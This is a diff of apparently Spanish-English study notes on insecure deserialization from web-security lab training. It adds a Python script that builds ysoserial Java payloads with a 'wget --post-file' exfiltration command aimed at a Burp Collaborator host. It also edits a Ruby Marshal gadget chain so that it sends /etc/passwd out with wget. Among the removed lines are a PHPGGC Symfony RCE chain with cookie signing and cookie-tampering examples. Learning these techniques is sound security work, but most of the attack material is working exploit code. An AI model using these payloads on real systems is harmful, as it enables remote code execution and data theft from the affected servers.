@@ -1,3 +1,59 @@
+# Reconocimiento Rápido: 
+
+> SIEMPRE analizar las cookies A MANO, un escaner podrá o no podrá identificar la deserialización insegura, pero nuestra cabeza, siempre podrá si estamos lo suficientemente preparados. 
+
+| Object Type     | Header (Hex) | Header (Base64) |
+| --------------- | ------------ | --------------- |
+| Java Serialized | AC ED        | rO              |
+| .NET ViewState  | FF 01        | /w              |
+| Python Pickle   | 80 04 95     | gASV            |
+| PHP Serialized  | 4F 3A        | Tz              |
+# Importante: ⚠️
+
+Para reconocer posibles puntos de entrada para su exploit, busque firmas que tengan todos los objetos serializados de Java:
+
+- La firma comienza con AC ED 00 05 en hexadecimal o ro0 en Base64 (por ejemplo, puede encontrarlas dentro de solicitudes HTTP como cookies o parámetros)
+- Encabezado de tipo de contenido de una respuesta HTTP establecida en application/x-java-serialized-object.
+## Script To Brute Force JAVA Deserialization: 
+```python
+#!/bin/python3
+import os, random
+
+burp_collab_link = "6szviq1i5ag33um9o5ya4rox7odg19py.oastify.com" # Used in testing if the command executed # CHANGE
+
+jar_filename = "ysoserial-all.jar"
+
+filename = "exploitsInBase64.txt" # for writing the output
+open(filename, 'w').close() # (clear/create) the file
+
+# ysoserial Payloads that will be tried
+payloads = ['AspectJWeaver', 'BeanShell1', 'C3P0', 'Click1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'FileUpload1', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JRMPListener', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'Jython1', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'URLDNS', 'Vaadin1', 'Wicket1']
+
+
+# Generate Exploits
+for p in payloads:
+    # Distinguish the lookup command by adding a number before the burp collab link.
+    rceCommand_nslookup = f"nslookup {p}.{burp_collab_link}"
+    rceCommand_exfiltrateFile = f"wget --post-file /home/carlos/secret {p}.{burp_collab_link}"
+
+    cmdOnServer =  rceCommand_exfiltrateFile # CHANGE
+
+    os.system(f"echo \#{p} >> {filename}")
+
+    ####### commment 1 of the commands # CHANGE
+    # Gzip the base64
+    command = f"/usr/lib/jvm/java-8-openjdk/jre/bin/java -jar {jar_filename} {p} '{cmdOnServer}' | gzip -f | base64 | tr --delete '\\n' >> {filename}"
+
+    # base64 only
+    # command = f"/usr/lib/jvm/java-8-openjdk/jre/bin/java -jar {jar_filename} {p} '{cmdOnServer}' | base64 | tr --delete '\\n' >> {filename}"
+
+    os.system(command)
+
+    for i in range(2): os.system(f"echo >> {filename}") # write 4 lines
+```
+
+---
+
 1. Decodear cookie y cambiar valor booleano a 1
 ```php
 O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
@@ -59,86 +115,14 @@ Checklist:
 6. Is it a php obj cookie? Try gadgets of phpgcc
 7. Is it Ruby? Try documented ruby gadgets of vakzz
 ```
-##### Basic Example:
-Decoded Cookie:
-O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
-Change admin value to 1 to gain admin privileges
 
-##### Change data types:
-```
-O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"iz8si09pn9qkciq8l74c75wmzxazhuqn";}
-```
-Change the length of user 6 to 13, and the name to administrator, remove access token and set it to i:0
-```
-O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
-```
+---
+## Payload -`Pro Tip BSCP`
 
-##### Cookie has a value linked to a path, such as avatar
-Change path to a file you want to delete:
-```
-O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"npc3ok28hj1yx4cwp5cn51rilvztsmtx";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
-```
-When you delete the acc also the path will be deleted
-
-##### Arbitrary Object Injection php
-Can you read them appending tilde (~)? GET /libs/CustomTemplate.php~
-The file says that we can unlink a file if lock_file_path is present on the template
-Create a new object that get serialized:
-```
-O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
-```
-Replace it on the cookie b64 encoded
-
-##### Exploiting Java deserialization with Apache Commons
-If decode the cookie we see java lang but its not readeable, however, we can abuse pre built gadges:
-Also it starts with rO0... to distinguish this cookies
-rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBiNzlvcWtraDZnbTM0cWo2ejdkYm5penZjazQzMzdpaXQABndpZW5lcg%3d%3d
-
-Use ysoserial.jar https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
-```
-/usr/lib/jvm/java-8-openjdk/bin/java -jar ysoserial-all.jar CommonsCollections4 'command' | base64 > payload
-cat payload | tr -d '\n'
-```
-Send the payload url encoded in repeater
-
-##### Exploiting PHP deserialization with a pre-built gadget chain
-Notice that when we try to change the cookie value we get a php error:
-PHP Fatal error: Uncaught Exception: Signature does not match session in /var/www/index.php:7
-A developer comment discloses the location of a debug file at `/cgi-bin/phpinfo.php`
-with the secret key of the serialization
-```
-<td class="e">SECRET_KEY </td><td class="v">ygwtquy6ahff4bjcp8xhkcj4geomohqz 
-```
-
-and we get the tech: Symfony 4.3.6 framework
-Use phpgcc to exploit this https://github.com/ambionics/phpggc
-
-```bash
-./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0; echo
-```
-
-Construct the php object with the payload and the secret key:
-```php
-<?php
-	$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
-
-	$secretKey = "0l215eta8pszvdtl0jauaff6l4yo6rxv";
-
- 	$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object , $secretKey) . '"}');
-
- 	echo $cookie;
-?>
-```
-
-php php-object-payload.php to get the cookie that is going to be used
-send the cookie to solve the lab
-
-##### Exploiting Ruby deserialization using a documented gadget chain
-
-Notice that when decodig username variable is like @username, an indicator of ruby language
-Here the script to save 'marshalled.rb':
 ```rb
+require 'net/http'  # Cargar la librería de red estándar
 require 'base64'
+
 # Autoload the required classes
 Gem::SpecFetcher
 Gem::Installer
@@ -156,7 +140,7 @@ wa1 = Net::WriteAdapter.new(Kernel, :system)
 
 rs = Gem::RequestSet.allocate
 rs.instance_variable_set('@sets', wa1)
-rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt") # change command here
+rs.instance_variable_set('@git_set', "wget https://COLLAB.com --post-file=/etc/passwd")
 
 wa2 = Net::WriteAdapter.new(rs, :resolve)
 
@@ -176,49 +160,13 @@ r = Gem::Requirement.allocate
 r.instance_variable_set('@requirements', t)
 
 payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
-puts Base64.encode64(payload)
+
+# Convert the payload to Base64
+encoded_payload = Base64.encode64(payload)
+
+puts "Payload en Base64 mi Papacho:"
+puts encoded_payload
 ```
-Run it with docker:
-```
-docker run -it --rm --name my-running-script -v "$PWD":/usr/src/myapp -w /usr/src/myapp ruby:3.0 ruby marshalled.rb
-```
-URL encode the output in the cookie on repeater and send
 
+![[Pasted image 20260810213426.png]]
 
-script to brute force java:
-```python
-#!/bin/python3
-import os, random
-
-burp_collab_link = "6szviq1i5ag33um9o5ya4rox7odg19py.oastify.com" # Used in testing if the command executed # CHANGE
-
-jar_filename = "ysoserial-all.jar"
-
-filename = "exploitsInBase64.txt" # for writing the output
-open(filename, 'w').close() # (clear/create) the file
-
-# ysoserial Payloads that will be tried
-payloads = ['AspectJWeaver', 'BeanShell1', 'C3P0', 'Click1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'FileUpload1', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JRMPListener', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'Jython1', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'URLDNS', 'Vaadin1', 'Wicket1']
-
-
-# Generate Exploits
-for p in payloads:
-    # Distinguish the lookup command by adding a number before the burp collab link.
-    rceCommand_nslookup = f"nslookup {p}.{burp_collab_link}"
-    rceCommand_exfiltrateFile = f"wget --post-file /home/carlos/secret {p}.{burp_collab_link}"
-
-    cmdOnServer =  rceCommand_exfiltrateFile # CHANGE
-
-    os.system(f"echo \#{p} >> {filename}")
-
-    ####### commment 1 of the commands # CHANGE
-    # Gzip the base64
-    command = f"/usr/lib/jvm/java-8-openjdk/jre/bin/java -jar {jar_filename} {p} '{cmdOnServer}' | gzip -f | base64 | tr --delete '\\n' >> {filename}"
-
-    # base64 only
-    # command = f"/usr/lib/jvm/java-8-openjdk/jre/bin/java -jar {jar_filename} {p} '{cmdOnServer}' | base64 | tr --delete '\\n' >> {filename}"
-
-    os.system(command)
-
-    for i in range(2): os.system(f"echo >> {filename}") # write 4 lines
-```
